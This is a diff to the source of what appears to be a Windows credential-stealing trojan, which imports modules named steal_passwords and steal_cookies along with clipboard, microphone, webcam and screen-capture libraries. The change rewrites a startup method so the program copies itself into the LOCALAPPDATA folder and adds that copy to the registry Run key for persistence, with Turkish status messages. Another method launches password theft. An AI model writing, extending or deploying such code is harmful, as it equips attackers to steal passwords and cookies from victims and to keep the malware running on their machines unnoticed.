@@ -1,4 +1,4 @@
-import subprocess, pyperclip, pyaudio, wave, cv2, pyautogui, os, winreg, requests
+import subprocess, pyperclip, pyaudio, wave, cv2, pyautogui, os, winreg, requests, shutil, sys
 
 from steal_passwords import StealPassword
 from steal_cookies import StealCookies
@@ -118,18 +118,22 @@ class Functions:
 
     def startup(self):
         try:
-            program_name = os.path.basename(__file__)
+            program_name = os.path.basename(sys.argv[0])
+            program_path = os.path.abspath(sys.argv[0])
 
-            program_path = os.path.abspath(__file__)
+            target_directory = os.path.join(os.environ['LOCALAPPDATA'])
+            os.makedirs(target_directory, exist_ok=True)
+
+            target_path = os.path.join(target_directory, program_name)
+
+            shutil.copy(program_path, target_path)
 
             reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
-
-            winreg.SetValueEx(reg_key, program_name, 0, winreg.REG_SZ, program_path)
+            winreg.SetValueEx(reg_key, program_name, 0, winreg.REG_SZ, target_path)
 
             print(f"'{program_name}' başarıyla başlangıç dizinine eklendi.")
-
         except Exception as e:
-            print(f"Error! {e}")
+            print(f"Hata: {e}")
 
     def StealPasswords(self):
         StealPassword.main()
